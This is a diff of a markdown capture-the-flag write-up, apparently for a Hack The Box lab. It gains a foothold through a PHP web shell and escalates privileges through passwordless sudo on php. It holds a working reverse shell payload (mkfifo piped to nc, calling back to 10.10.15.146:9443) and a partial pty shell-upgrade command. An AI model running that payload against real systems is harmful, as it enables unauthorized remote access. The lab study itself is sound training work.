@@ -92,9 +92,7 @@ The identified paths include:
 
 <img width="403" height="399" alt="image" src="https://github.com/user-attachments/assets/007f8a03-7d85-48ad-b821-da0c6642ae60" />
 
-
 <img width="430" height="222" alt="image" src="https://github.com/user-attachments/assets/de3ed101-af20-4eca-b33e-606c9323882f" />
-
 
 <img width="774" height="262" alt="image" src="https://github.com/user-attachments/assets/436ec8ba-1b78-4516-8345-e07b0ea70100" />
 
@@ -129,20 +127,24 @@ echo "d033e22ae348aeb5660fc2140aec35850c4da997" >> KnowledgeCheck.txt
 
 <img width="818" height="108" alt="image" src="https://github.com/user-attachments/assets/bb33ffd9-8001-43ea-8bcb-e959a367344f" />
 
+```
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.146 9443 >/tmp/f"); ?>
+```
 
 <img width="536" height="124" alt="image" src="https://github.com/user-attachments/assets/e5f115e8-c885-4c32-9fa0-2c6b98e3107d" />
 
-
+```
 use ls to check directiry  
 or  
 python3 -c 'import pty; pty.spawn("/bin/bash
 run this command for more interactive shell
-
+```
 <img width="296" height="217" alt="image" src="https://github.com/user-attachments/assets/d57f915c-53a9-405e-a0d5-19c3733db3e3" />
 
 <img width="1375" height="545" alt="image" src="https://github.com/user-attachments/assets/e95a519c-be9b-46a7-b18e-733c0fd5531c" />
+
 ## Privilege Escalation
+
 <img width="958" height="112" alt="image" src="https://github.com/user-attachments/assets/5ecffb08-d19a-4b4b-ac9e-ab43a54ac49d" />
 
 https://github.com/rebootuser/LinEnum
@@ -150,21 +152,26 @@ https://github.com/rebootuser/LinEnum
 https://academy.hackthebox.com/module/77/section/844
 
 <img width="726" height="255" alt="image" src="https://github.com/user-attachments/assets/382972dc-6539-4e59-94e9-3593ec6de60b" />
+
 >use vpn ip address
+
 <img width="650" height="100" alt="image" src="https://github.com/user-attachments/assets/c04f49e0-4b1c-4682-afc3-392e4e541ba2" />
 
-use vpn ip address
+>use vpn ip address
+
 <img width="644" height="192" alt="image" src="https://github.com/user-attachments/assets/c0679a95-ab2c-4a45-9524-19932a07b436" />
 
 <img width="458" height="88" alt="image" src="https://github.com/user-attachments/assets/0c10fd9e-9d75-4cd0-8b51-c9743c6678c9" />
- its not working so i will use sudo -l
+
+>its not working so i will use sudo -l
 
  <img width="753" height="134" alt="image" src="https://github.com/user-attachments/assets/db14c768-4dfb-4a9d-99d1-c16a23a94dda" />
 
- we can use /usr/bin/php without password
+>we can use /usr/bin/php without password
+>got root shell
 
-got root shell 
 <img width="604" height="91" alt="image" src="https://github.com/user-attachments/assets/69a8e468-9890-412d-84cc-1543cc163337" />
+<br>
 <img width="374" height="198" alt="image" src="https://github.com/user-attachments/assets/103ca6db-d85b-4d62-8498-79c781c168c6" />
 
 
